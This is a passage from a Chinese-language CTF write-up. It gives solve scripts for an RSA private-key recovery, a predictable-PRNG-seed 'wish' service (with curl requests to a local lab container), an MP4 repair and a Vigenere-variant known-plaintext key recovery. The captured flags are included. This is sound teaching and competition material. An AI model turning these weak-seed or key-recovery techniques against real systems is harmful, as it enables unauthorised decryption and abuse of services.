string-interpolation"><span class="token string">f"q2=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">if</span> n<span class="token operator">%</span>q2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    p<span class="token operator">=</span>n<span class="token operator">//</span>q2</pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    </pre></td></tr><tr><td data-num="30"></td><td><pre>q<span class="token operator">=</span>q2</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment"># 求 e</span></pre></td></tr><tr><td data-num="32"></td><td><pre>h1 <span class="token operator">=</span> <span class="token number">150247</span></pre></td></tr><tr><td data-num="33"></td><td><pre>h2 <span class="token operator">=</span> <span class="token number">102488</span></pre></td></tr><tr><td data-num="34"></td><td><pre>h4 <span class="token operator">=</span> <span class="token number">44535490898726654427376304836986323627856798106830892558987452614726931403119</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"q=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>tmp <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> h1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    e <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">if</span> GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> e <span class="token operator">&lt;</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span> tmp <span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token operator">%</span> h1 <span class="token operator">==</span> h2<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"maybe e=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"maybe d=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        nh4 <span class="token operator">=</span> d <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span>d<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token keyword">if</span> nh4 <span class="token operator">==</span> h4<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"d=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>开 8 个线程运行一晚上，成功枚举到正确的 e, 并得到 d</p><p>使用下面的脚本，根据私钥解密密文，得到 flag</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="2"></td><td><pre>e <span class="token operator">=</span> <span class="token number">36905723839</span></pre></td></tr><tr><td data-num="3"></td><td><pre>d <span class="token operator">=</span> <span class="token number">66781150190539205038154636873316650284846375610597564467113301562207220876080997654261761651771185773920764536611596660709696442562219146865775186656742157829910073552979854383590613522355255045862718785890708775548436159002198598103886840865569957379996409759081212055357149668774721007823047658341778542959</span></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> <span class="token number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></pre></td></tr><tr><td data-num="5"></td><td><pre>c <span class="token operator">=</span> <span class="token number">33087238461387318335074410411142790336660168200231648518849044049333308060938917518277424800358623613184976785426565004507278568420843160272353164463818453523209164535111619601021121321114970839731250362111118957833038271450092546392532900928613625992384890463665974527179679504545602403023570778993190377708</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><code>W4terCTF&#123;W47cH_oUT_7He_Smok3_hIn75_1ROM_wll5oN&#125;</code></p><h2 id="wish"><a class="anchor" href="#wish">#</a> Wish</h2><p>查看源代码，看到确定抽取结果的逻辑：</p><figure class="highlight python"><figcaption data-lang="python"><span>app.py</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_wish</span><span class="token punctuation">(</span>time<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>time<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    probability <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        diff <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1919810</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        probability <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span> <span class="token operator">**</span> diff</pre></td></tr><tr><td data-num="7"></td><td><pre>    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token string-interpolation"><span class="token string">f'probability: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>probability<span class="token punctuation">&#125;</span></span><span class="token string">, time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">&#125;</span></span><span class="token string">, index: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> probability<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"flag"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits</pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>characters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>发现是利用 <code>time</code> 作为伪随机数序列的初始化种子，要想抽出 flag ，需要 <code>probability</code> 尽可能地大，那么 <code>index</code> 只能取 <code>1</code> ， <code>abs(random.randint(0, 1919810) - 114514)</code> 的值只能为 <code>0</code> 或 <code>1</code> ，所以据此爆破出一个可行的 <code>time</code> ：</p><figure class="highlight python"><figcaption data-lang="python"><span>pwn_time.py</span></figcaption><table><tr><td data-num="1"></td><td><pre>r <span class="token operator">=</span> <span class="token number">24</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1919810</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">114514</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到唯一符合目标的结果： <code>time=20544</code> ，然后就是真的抽 flag ：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">curl</span> <span class="token parameter variable">-X</span> GET <span class="token parameter variable">-H</span> <span class="token string">"Content-Type:application/octet-stream"</span> http://127.0.0.1:52829/query_reset</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 获取 3 次 wish 机会</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'&#123;"time":20544,"index":1&#125;'</span> http://127.0.0.1:52829/wish</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 抽 flag</span></pre></td></tr></table></figure><p><code>W4terCTF&#123;Crack_insteal_of_wish_the_seed_d0ab21251107&#125;</code></p><blockquote><p>即使这样还抽了十几次才出 flag , 好黑的池子！</p></blockquote><h1 id="misc"><a class="anchor" href="#misc">#</a> Misc</h1><h2 id="sign-in"><a class="anchor" href="#sign-in">#</a> Sign In</h2><p>排行榜</p><h2 id="brokenmp4"><a class="anchor" href="#brokenmp4">#</a> broken.mp4</h2><p>按照 record_1.mp4 的指引，找到了文章链接</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05EQVNIL2FydGljbGUvZGV0YWlscy8xMzYxNTE0MTg=">https://blog.csdn.net/NDASH/article/details/136151418</span></p><p>按照文章指引，去 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FudGh3bG9jay91bnRydW5jL3JlbGVhc2VzL3RhZy9sYXRlc3Q=">https://github.com/anthwlock/untrunc/releases/tag/latest</span> 下载所需的软件，选择 <code>untrunc_x64</code></p><p>运行 <code>untrunc-gui</code> , reference file 选 <code>record_1.mp4</code> , truncated file 选 <code>record_2.mp4</code></p><p><img data-src="https://s2.loli.net/2024/04/29/Pn5XoKV7AfyCdEg.png" alt="brokenmp4"></p><p>这样就能得到 <code>record_2.mp4</code> 的修复版，在视频结尾能找到 flag</p><p><code>W4terCTF&#123;L1fe_is_5h0rT_so_i_Us3_MKV_248DF3C&#125;</code></p><h2 id="shuffle-puts"><a class="anchor" href="#shuffle-puts">#</a> Shuffle Puts</h2><p>启动容器，从浏览器访问，可以下载一个文件 meow</p><p>执行下面的命令查看文件中所有字符串</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>strings .<span class="token punctuation">\</span>meow</pre></td></tr></table></figure><p>在输出中可以找到 flag</p><p><code>W4terCTF&#123;sHUFF1e_5hufF1e_FLA6_MEOWmeOWm30W&#125;</code></p><h2 id="revenge-of-vigenere"><a class="anchor" href="#revenge-of-vigenere">#</a> Revenge of Vigenere</h2><p>这题的加密是维吉尼亚密码的一个变种</p><p>连接容器后，只能获得加密后的密文</p><p>解决思路是如果知道原文的一个片段，而且知道完整的密文，可以尝试倒推 KEY。</p><p>原文中存在 W4terCTF 是确定的，可以据此倒退 KEY</p><p>运行下面的代码，根据已知的明文 <code>W4terCTF</code> 和密文 <code>Q4doySZB</code> , 尝试推出密钥的其中连续 7 位</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    recv <span class="token operator">=</span> <span class="token string">'Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment"># print(recv)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># print(len(recv))</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    index <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    idx_arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> recv<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">if</span> ch<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            idx_arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            idx_arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment"># print(idx_arr)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    start <span class="token operator">=</span> <span class="token number">609</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment"># start = 0</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token string">'W4terCTF'</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            mi_i <span class="token operator">=</span> start <span class="token operator">+</span> i</pre></td></tr><tr><td data-num="24"></td><td><pre>            mi <span class="token operator">=</span> recv<span class="token punctuation">[</span>mi_i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            mi_idx<span class="token operator">=</span>idx_arr<span class="token punctuation">[</span>mi_i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">if</span> x<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            val <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">for</span> v <span class="token keyword">in</span> val<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span>mi_idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span>base<span class="token operator">+</span>mi_idx<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>mi<span class="token punctuation">)</span><span class="token operator">-</span>base <span class="token keyword">or</span> <span class="token punctuation">(</span>mi_idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span>base<span class="token operator">-</span>mi_idx<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>mi<span class="token punctuation">)</span><span class="token operator">-</span>base<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mi<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mi_idx<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    test<span class="token punctuation">(</span>start<span class="token punctuation">,</span><span class="token builtin">min</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    start<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token builtin">min</span><span class="token operator">=</span><span class="token string">'Hello'</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token comment"># test(start,min)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">break</span></pre></td></tr></table></figure><p>运行结果如下，为密钥其中连续七位可能的取值，每一位可能会出现多种取值，所以有些行有两个字母</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>K X </pre></td></tr><tr><td data-num="2"></td><td><pre>W,Q,496</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>O </pre></td></tr><tr><td data-num="5"></td><td><pre>t,d,497</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>J W</pre></td></tr><tr><td data-num="8"></td><td><pre>e,o,498</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>J</pre></td></tr><tr><td data-num="11"></td><td><pre>r,y,499</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>H U</pre></td></tr><tr><td data-num="14"></td><td><pre>C,S,500</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>O</pre></td></tr><tr><td data-num="17"></td><td><pre>T,Z,501</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>G T</pre></td></tr><tr><td data-num="20"></td><td><pre>F,B,502</pre></td></tr></table></figure><p>然后，利用下面的代码，用部分密钥尝试还原出原文</p><p>因为只知道密钥的一部分，所以只能还原原文的一些片段。具体的操作为，考虑到密钥的长度在 10 和 20 之间，枚举密钥的长度，对于每个枚举，根据 <code>Q4doySZB</code> 在密文中的位置推算已知密钥片段在密钥中的位置</p><p>另外，考虑到密钥已知部分的每一位都可能有多种取值，还需要用回溯法枚举所有可能的密钥片段，可能性只有 16 种，数量不是很大</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre>recv <span class="token operator">=</span> <span class="token string">'Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.'</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># recv = 'Q4doySZB'</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># from secret import original_text</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># print(original_text)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>start <span class="token operator">=</span> <span class="token number">496</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token 